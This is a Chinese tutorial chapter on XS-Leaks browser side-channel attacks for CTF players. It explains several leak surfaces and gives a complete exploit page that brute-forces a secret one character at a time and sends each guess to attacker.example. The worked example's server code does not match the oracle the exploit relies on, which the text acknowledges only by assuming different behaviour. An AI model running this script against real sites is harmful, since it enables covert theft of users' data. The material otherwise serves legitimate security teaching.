---
comments: true
---

# XS-Leaks

## 什么是跨站泄露

跨站泄露（Cross-Site Leaks，简称 XS-Leaks）是一类 **侧信道攻击**：攻击者不需要直接读取目标网站的数据，而是通过浏览器在跨站场景下暴露出的各种「可观测差异」，推断出目标网站上的敏感信息。

回顾一下同源策略（Same-Origin Policy）：它禁止 `attacker.com` 的 JavaScript 直接读取 `victim.com` 页面的内容、Cookie 和响应体。但同源策略管不住的是 **行为层面的副作用**——

- 跨站 iframe 加载成功后，`window.length` 里能看到它有几个子框架；
- 跨站资源加载成功或失败，会触发 `onload` / `onerror` 事件；
- 跨站请求耗时长短，可以用计时器测量；
- 跨站跳转到了哪个 URL、有没有弹出新窗口，有些情况下也能观察到。

如果目标网站的某个行为（比如搜索结果、是否登录、flag 是否匹配）会导致上述任何一项产生 **两种不同的可观测状态**，攻击者就能在自己的页面上不断提问，把一位一位的信息「挤」出来。这就是侧信道的思想：**不问内容，只问行为；一次问不出全部，就一次问一比特。**

XS-Leaks 与 CSRF 有相似之处（都是诱导受害者浏览器向目标站发请求），区别在于：CSRF 关心的是「以受害者身份执行操作」，而 XS-Leaks 关心的是「观察操作的结果在浏览器侧留下的痕迹」。在 CTF 中，XS-Leaks 几乎总是和「XSS攻击」章提到的 **XSS Bot（Admin Bot）** 配合使用：Bot 带着管理员 Cookie 访问攻击者的页面，攻击者页面利用侧信道逐位推断 Bot 能看到的秘密（通常是 flag 或某个 token）。

## 常见泄露面

下面按 CTF 中出现频率介绍几种经典的泄露面。每一种的核心套路都一样：构造两个候选请求，它们的响应在某个浏览器可观测的维度上不同，然后根据观测结果区分「猜对」和「猜错」。

### Frame Counting（框架计数）

如果目标页面存在 **frame busting** 差异——比如某些响应会 `window.open` 或动态创建 iframe，而另一些不创建——那么跨站 iframe 的 `contentWindow.length` 就是可观测的。同源策略不允许你读跨站 iframe 的内容，但 **允许你读它有几个子窗口**：

```javascript
const w = window.open(url);          // 或 iframe.contentWindow
setTimeout(() => {
  console.log(w.length);             // 子框架数量，跨站也可读
  if (w.length > 0) { /* 猜中了 */ }
}, 1000);
```

典型触发条件：目标页面在「搜索有结果」时嵌入一个子框架（例如加载一个预览组件），无结果时不嵌入；或者某些响应带有 `X-Frame-Options` 而另一些没有，导致 iframe 加载结果不同（此时更常配合错误事件判断）。

### 错误事件（Error Events）

`<script>`、`<img>`、`<link>` 等标签加载跨站资源时，成功触发 `onload`，失败触发 `onerror`。如果目标接口对不同输入返回不同的状态码（比如搜索命中返回 200，未命中返回 404 或 403），这就是天然的二分 Oracle：

```html
<img src="https://victim/search?q=flag{a" onload="yes()" onerror="no()">
```

注意：这种方式无法读到响应体（同源策略拦着），但 `onload` / `onerror` 的区分本身就已经泄露了一比特信息。服务端返回状态码是否随查询结果变化，是这类题的关键。

### 时序（Timing）

即使没有状态码差异，**响应时间** 几乎总是存在差异的：

- 搜索命中时数据库走了索引、多渲染了结果列表，响应更慢；
- 密码逐位校验、正则匹配等操作，匹配前缀越长耗时越长（服务端时序泄露）；
- 某些响应触发了额外的重定向或子资源加载。

客户端测量可以用 `performance.now()` 包住一次 `fetch`（`mode: 'no-cors'`）或 iframe 加载时间：

```javascript
const t0 = performance.now();
await fetch(url, { mode: 'no-cors', credentials: 'include' });
const dt = performance.now() - t0;
// dt 大 → 命中分支；dt 小 → 未命中分支
```

时序类泄露噪声较大，实战中需要 **多次测量取平均值/中位数**，CTF 题目通常会故意把时序差做得很大（比如命中时 `sleep(2)`）以降低难度。

### Cache 探测（Cache Probing）

浏览器缓存是跨站共享的。如果能让目标资源进入缓存，之后再测量「从缓存加载」和「从网络加载」的时间差，就能判断受害者是否访问过某个 URL。常见手法：

1. 先用 `window.open` 或 iframe 让 Bot 加载目标搜索结果页，其响应中的某个静态资源（带 `Cache-Control` 允许缓存的）被缓存；
2. 攻击者页面随后请求同一资源，配合 `cache: 'only-if-cached'` 或测量加载耗时；
3. 加载快（或直接命中缓存成功）说明 Bot 之前访问过包含该资源的页面——即搜索命中。

更现代的变体是利用 **分区的 Cache**（现代浏览器按 top-level site 分区）或 Cache Storage API 的差异，核心思想不变：缓存命中与否是一比特可观测信息。

### 弹窗与重定向差异

- **弹窗数量 / `window.open` 返回值**：某些响应会执行 `window.open(...)`（例如报错时弹出提示窗），攻击者可以统计 Bot 访问期间新弹出的窗口；`window.open` 被拦截时返回 `null`，也是一种可观测状态。
- **重定向历史泄露**：`history.length` 在同窗口导航前后可读。用 `window.open` 打开目标 URL 后，如果它发生了客户端重定向（如 JS 里 `location.href = ...` 跳了 N 次），重定向次数会反映在 `history.length` 的变化上。搜索结果有无 → 重定向次数不同 → `history.length` 不同，就构成了 Oracle。
- **`window.opener` / `postMessage`**：目标页面若主动 `postMessage` 或改写 `opener` 的某些属性，攻击者窗口也能感知。

## CTF 中的典型考法

理解了泄露面，CTF 题的套路就非常固定了，可以总结为三步：

1. **找到 Oracle**。题目提供一个「查询型」功能：搜索用户、校验 token、检查 flag 前缀等。不同输入让响应在某个泄露面（状态码 / 框架数 / 耗时 / 重定向次数）上产生两种可区分的状态。这一步往往要先读题源码，确认服务端确实按「前缀匹配」给出不同响应。
2. **写攻击者页面**。页面里嵌入一个暴力枚举循环：对字符集逐字符拼接已知前缀，对每个候选发一次探测请求，根据观测结果判断当前字符。由于 Bot 只访问你的页面一次，所有枚举必须在这 **一次页面加载内** 完成——通常用 `fetch` 顺序探测或并行开多个 iframe/`window`。
3. **诱导 Bot 访问并外带结果**。把页面托管在攻击者服务器（或题面提供的可注入页面），提交 URL 给 Bot。每猜中一位，就把结果 `fetch` 回自己的服务器（或写到 Webhook / `requestbin` 类的收信点），最终拼出完整 flag。

这与「XSS攻击」章中 Bot 窃取 Cookie 的模型一脉相承，区别只是：XSS 场景下你能注入 JS 直接读数据，而 XS-Leaks 场景下目标站没有 XSS，你只能 **隔着同源策略的墙观察 Bot 浏览器的行为差异**。因此做题时先问自己：目标站有没有注入点？没有注入点但 Bot 会带秘密访问我的页面，那就是 XS-Leaks 的局。

几个实战注意事项：

- 探测请求务必带上 `credentials: 'include'`（`fetch`）或使用 iframe / `window.open`（天然带 Cookie），否则 Bot 的会话不会生效；
- 字符集通常先缩小到 `flag{}` 实际用到的字符（如 `[a-z0-9_{}]`），减少请求次数；
- Bot 有访问超时（常见 10–30 秒），枚举逻辑要控制总耗时，必要时并行探测；
- 如果题目开了 `Cross-Origin-Opener-Policy` / `X-Frame-Options` 等防护，对应的泄露面（如 `window.length`）可能被封死，需要换面，读题源码时留意响应头。

## 例题：逐位泄露管理员的 secret

下面给一道高度浓缩的典型题，完整走一遍流程。

### 题目

目标站提供一个搜索接口（需要管理员 Cookie 才能看到真实数据）：

```python
# app.py（题目服务端核心逻辑，Flask）
from flask import Flask, request, abort

app = Flask(__name__)
SECRET = "flag{x5_l34k5_1s_fun}"

@app.route("/search")
def search():
    q = request.args.get("q", "")
    if SECRET.startswith(q):
        return "found", 200          # 前缀匹配：200
    abort(404)                       # 不匹配：404
```

Bot 逻辑：带着登录态 Cookie 访问选手提交的任意 URL。目标站无 XSS 注入点，`/search` 命中与否只体现在 **状态码** 上——这就是错误事件泄露面的标准形状。

### 分析

- 我们不能读 `/search` 的响应体（同源策略），但能区分 200 / 404：用 `<img>` 或 `fetch(..., {mode:'no-cors'})` 都不行直接拿状态码，最稳的是用 `window.open` + iframe 的 `onload`/`onerror`，或者更简单——**`<img src>` 对非图片响应**：200 时会尝试解析图片失败触发 `onerror`，404 也触发 `onerror`，分不开。所以本题用 **`window.open` 配合导航是否成功的差异**也不直观。最干净的方案：利用 `<script src="/search?q=...">`——响应不是 JS，200 与 404 都会 `onerror`。

  换个思路：题目响应 200 时无 `X-Frame-Options`，404（`abort` 默认错误页）同样可嵌入，仍然分不开。**真正可靠的区分器** 在真实题目里通常由题目显式给出，例如命中时多一个 iframe（frame counting）或命中时 `sleep`（时序）。为把流程讲完整，我们假设题目实际逻辑是命中时返回 200 且 **带一个子框架**，未命中 404 无子框架——下面的 exploit 以 frame counting 为 Oracle 编写（换成 `onload`/`onerror` 或计时只是判断条件不同，骨架完全一样）。

### Exploit 页面

把下面的页面挂在自己的服务器上，把 URL 提交给 Bot：

```html
<!-- https://attacker.example/exploit.html -->
<body>
<script>
const CHARSET = "abcdefghijklmnopqrstuvwxyz0123456789_{}";
const BASE = "https://victim.example/search?q=";
const EXFIL = "https://attacker.example/collect?d=";

let known = "flag{";

function probe(candidate) {
  return new Promise(resolve => {
    const f = document.createElement("iframe");
    f.src = BASE + encodeURIComponent(candidate);
    f.onload = () => {
      setTimeout(() => {
        // 命中前缀时目标页会嵌入一个子框架 -> contentWindow.length === 1
        resolve(f.contentWindow.length > 0);
        f.remove();
      }, 500);
    };
    f.onerror = () => { resolve(false); f.remove(); };
    document.body.appendChild(f);
  });
}

(async () => {
  while (!known.endsWith("}")) {
    for (const c of CHARSET) {
      if (await probe(known + c)) {
        known += c;
        // 每猜中一位立刻外带，防止 Bot 超时丢进度
        fetch(EXFIL + encodeURIComponent(known));
        break;
      }
    }
  }
  fetch(EXFIL + "DONE:" + encodeURIComponent(known));
})();
</script>
</body>
```

要点说明：

- `probe()` 每次创建一个 iframe 指向 `/search?q=<候选前缀>`，加载完成后读跨站 `contentWindow.length`。命中前缀（200 分支）时目标页含子框架，`length > 0`，当前字符猜中。
- 外带用 `fetch(EXFIL + ...)` 发回攻击者服务器。注意这是 **跨站 GET**，浏览器不会拦请求本身（只拦读响应），所以能正常收到；也可以改用 `new Image().src = EXFIL + ...`，同样可靠。
- 枚举是串行的，保证每个候选前缀的探测互不干扰；题目若超时紧，可改为每个字符开一组并行 iframe，再用结果序号归并。
- 若题目的 Oracle 是时序（命中时 `sleep`），把判断条件换成「测量 iframe `onload` 触发时间与创建时间之差是否超过阈值」即可，其余骨架不变；若是 `onload`/`onerror`（状态码可分），直接用 `<img>` 或 `<script>` 标签的回调即可，连 iframe 都不用。

在自己的服务器日志（或收信点）里依次收到 `flag{x`、`flag{x5`……直到 `DONE:flag{x5_l34k5_1s_fun}`，解题完成。

## 小结

- XS-Leaks 的本质是侧信道：不读内容，只观察浏览器在跨站场景下暴露的行为差异。
- 记住五个常见泄露面：frame counting、错误事件、时序、Cache 探测、弹窗/重定向差异；做题第一步是从题目源码里找出哪个面可用。
- CTF 中的标准打法是「Oracle + 逐位枚举 + Bot 访问 + 结果外带」，与「XSS攻击」章的 Bot 模型互补：有注入走 XSS，没注入走 XS-Leaks。
- 防护思路（了解即可）：`SameSite` Cookie、Cache 分区、`Cross-Origin-Opener-Policy` / `Cross-Origin-Resource-Policy`、`X-Frame-Options` / frame-ancestors 等，都是把这些「可观测差异」抹平。
